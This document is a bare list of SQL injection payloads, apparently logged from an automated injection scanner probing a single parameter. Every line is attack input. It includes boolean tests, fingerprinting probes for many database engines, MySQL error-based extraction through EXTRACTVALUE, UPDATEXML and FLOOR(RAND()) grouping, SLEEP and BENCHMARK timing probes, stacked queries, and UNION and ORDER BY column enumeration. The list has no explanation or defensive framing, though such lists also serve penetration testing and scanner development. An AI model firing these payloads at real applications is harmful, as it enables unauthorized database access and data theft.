"2...))',,("""
"2'BJFmIb<'"">sBuznf"
2) AND 4544=3303-- fIxm
2) AND 5489=5489-- kDxo
2') AND 3359=2153-- mhsG
2') AND 5489=5489-- XOZE
2' AND 2308=4240-- ICrE
2' AND 5489=5489-- Lphl
2' AND 7232=3419-- BFwH
2' AND (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL-- hbxd
"2' AND (SELECT TDESENCRYPT(NULL,NULL)) IS NULL-- TidC"
2' AND (SELECT %SQLUPPER NULL) IS NULL-- qTTg
2' AND (SELECT halfMD5(NULL) IS NULL) IS NULL-- Cpdd
2' AND (SELECT MD5(NULL~NULL)) IS NULL-- rICW
2' AND (SELECT (NULL SETEQ NULL)) IS NULL-- YBQG
2' AND (SELECT CHR(82)||CHR(66)||CHR(67)||CHR(80) FROM SYSIBM.SYSDUMMY1)='RBCP'-- vPXg
"2' AND (SELECT NULLIF(USER,SESSION_USER) FROM SYSIBM.SYSDUMMY1) IS NULL-- ZaqW"
2' AND (SELECT NULLIFZERO(hashcode(NULL))) IS NULL-- tWTT
2' AND (SELECT 'oSfI' FROM RDB$DATABASE)='oSfI'-- yVmN
2' AND (SELECT 'wViw' FROM INFORMATION_SCHEMA.IO_STATISTICS)='wViw'-- Wkif
2' AND (SELECT STRINGTOUTF8(NULL)) IS NULL-- Jaiq
2' AND (SELECT CHAR(73)||CHAR(86)||CHAR(112)||CHAR(115) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='IVps'-- TUQx
2' AND (SELECT 'UtwA' FROM SYSMASTER:SYSDUAL)='UtwA'-- Bfqk
2' AND (SELECT ALPHA(NULL) FROM VERSIONS) IS NULL-- TLMf
2' AND (SELECT TONUMBER(NULL)) IS NULL-- XkZJ
2' AND (SELECT ASCII_CHAR(256) FROM SYSTEM.ONEROW) IS NULL-- KxZc
2' AND (SELECT CODE(NULL)) IS NULL-- DeDo
"2' AND (SELECT DIFFERENCE(NULL,NULL)) IS NULL-- vpMZ"
2' AND (SELECT QUARTER(NULL XOR NULL)) IS NULL-- KLrP
2' AND (SELECT 0x78657667)='XDrP'-- rwzR
"2' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(9960=9960,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- KAOh"
"2' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(6090=6090,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- sGOl"
"2' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(7705=7705,1))),0x717a767a71,0x78))x))-- jBcG"
"2' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x71787a6a71,(SELECT (ELT(3325=3325,1))),0x717a767a71,0x78))x))-- BngJ"
"2' AND GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(7878=7878,1))),0x717a767a71),7878)-- jyRh"
"2' OR GTID_SUBSET(CONCAT(0x71787a6a71,(SELECT (ELT(1880=1880,1))),0x717a767a71),1880)-- YgUQ"
"2' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2354=2354,1))),0x717a767a71)) USING utf8)))-- GZLg"
"2' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x71787a6a71,(SELECT (ELT(2236=2236,1))),0x717a767a71)) USING utf8)))-- zHYE"
"2' AND (SELECT 2544 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2544=2544,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dqde"
"2' OR (SELECT 2835 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(2835=2835,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BXeK"
"2' AND EXTRACTVALUE(5131,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(5131=5131,1))),0x717a767a71))-- xXyY"
"2' OR EXTRACTVALUE(9151,CONCAT(0x5c,0x71787a6a71,(SELECT (ELT(9151=9151,1))),0x717a767a71))-- QLDI"
"2' AND UPDATEXML(5891,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(5891=5891,1))),0x717a767a71),8129)-- lACi"
"2' OR UPDATEXML(3008,CONCAT(0x2e,0x71787a6a71,(SELECT (ELT(3008=3008,1))),0x717a767a71),7879)-- ydsN"
"2' AND ROW(7230,9582)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(7230=7230,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 9213 UNION SELECT 5108 UNION SELECT 6351 UNION SELECT 5379)a GROUP BY x)-- hUZw"
"2' OR ROW(5143,2397)>(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (ELT(5143=5143,1))),0x717a767a71,FLOOR(RAND(0)*2))x FROM (SELECT 8985 UNION SELECT 4804 UNION SELECT 3884 UNION SELECT 7918)a GROUP BY x)-- SKzI"
-8121
"-9599' OR 1 GROUP BY CONCAT(0x71787a6a71,(SELECT (CASE WHEN (5825=5825) THEN 1 ELSE 0 END)),0x717a767a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
"2' PROCEDURE ANALYSE(EXTRACTVALUE(8342,CONCAT(0x5c,0x71787a6a71,(SELECT (CASE WHEN (8342=8342) THEN 1 ELSE 0 END)),0x717a767a71)),1)-- hgsJ"
"(SELECT CONCAT(CONCAT('qxzjq',(CASE WHEN (5005=5005) THEN '1' ELSE '0' END)),'qzvzq'))"
"(SELECT CONCAT(0x71787a6a71,(ELT(8034=8034,1)),0x717a767a71))"
2';SELECT SLEEP(5)#
2';SELECT SLEEP(5)-- pyVz
2';(SELECT * FROM (SELECT(SLEEP(5)))NlBE)#
2';(SELECT * FROM (SELECT(SLEEP(5)))elFt)-- CQTy
"2';SELECT BENCHMARK(5000000,MD5(0x744d6747))#"
"2';SELECT BENCHMARK(5000000,MD5(0x70764a4d))-- WoXS"
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(0)))WMTq)-- ZHKj
2' AND (SELECT 3389 FROM (SELECT(SLEEP(5)))WMTq)-- ZHKj
2' ORDER BY 1-- -
2' ORDER BY 8691-- -
2' ORDER BY 10-- -
2' ORDER BY 6-- -
2' ORDER BY 4-- -
2' ORDER BY 3-- -
2' ORDER BY 2-- -
"-5628' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3395' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3608' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3119' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-4491' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6791' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3963' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6339' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2812' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7204' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-9279' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3271' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2154' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-8135' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-5971' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6896' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3390' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-5491' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7002' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6586' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6662' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6404' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7269' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6557' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6530' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7914' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-8956' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7360' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-9775' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6001' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2086' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-3316' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-8630' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2409' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2138' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-4427' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-4330' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-2878' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7765' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-6484' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-5006' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
"-7196' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49-- -"
-6558' UNION ALL SELECT 49#
"-5763' UNION ALL SELECT 49,49#"
"-6566' UNION ALL SELECT 49,49,49#"
"-7989' UNION ALL SELECT 49,49,49,49#"
"-2896' UNION ALL SELECT 49,49,49,49,49#"
"-7072' UNION ALL SELECT 49,49,49,49,49,49#"
"-4135' UNION ALL SELECT 49,49,49,49,49,49,49#"
"-5802' UNION ALL SELECT 49,49,49,49,49,49,49,49#"
"-3677' UNION ALL SELECT 49,49,49,49,49,49,49,49,49#"
"-1244' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49#"
"-4626' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49#"
"-2725' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49#"
"-7724' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8522' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-4837' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-1222' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-2928' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-1423' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-9614' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8906' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x4a5951526e534978547151567a6f6479575a6954624d614d584c6b68695652696472527946427459,0x717a767a71),49#"
"2' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x6a67696453545a6848716179744e7778777668764b7479436e62774351684c596f706e58476c5775,0x717a767a71)#"
"2' UNION ALL SELECT CONCAT(0x71787a6a71,0x5a79776c556963485353,0x717a767a71),49#"
"2' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x65707170706550516657,0x717a767a71)#"
"-5927' UNION ALL SELECT CONCAT(0x71787a6a71,0x6a5a426151435546585945474e64746a4d6d44696c54624d4b50654771456e436779436162695663,0x717a767a71),49#"
"-6899' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x5061566d544d50416c4b67635953505342586d5a666d6463674b564470756e566e4756485a734469,0x717a767a71)#"
"-3624' UNION ALL SELECT CONCAT(0x71787a6a71,0x4761786f75676d57547a,0x717a767a71),49#"
"-4440' UNION ALL SELECT 49,CONCAT(0x71787a6a71,0x66765772454b6a437074,0x717a767a71)#"
"-2562' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-4455' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-2273' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-4955' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-3624' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-7517' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-4984' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8572' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-1819' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-7660' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-2555' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-9763' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-6264' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-9259' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-5114' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-5486' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-5147' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-6628' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-5754' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8898' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8860' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
"-8294' UNION ALL SELECT 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49#"
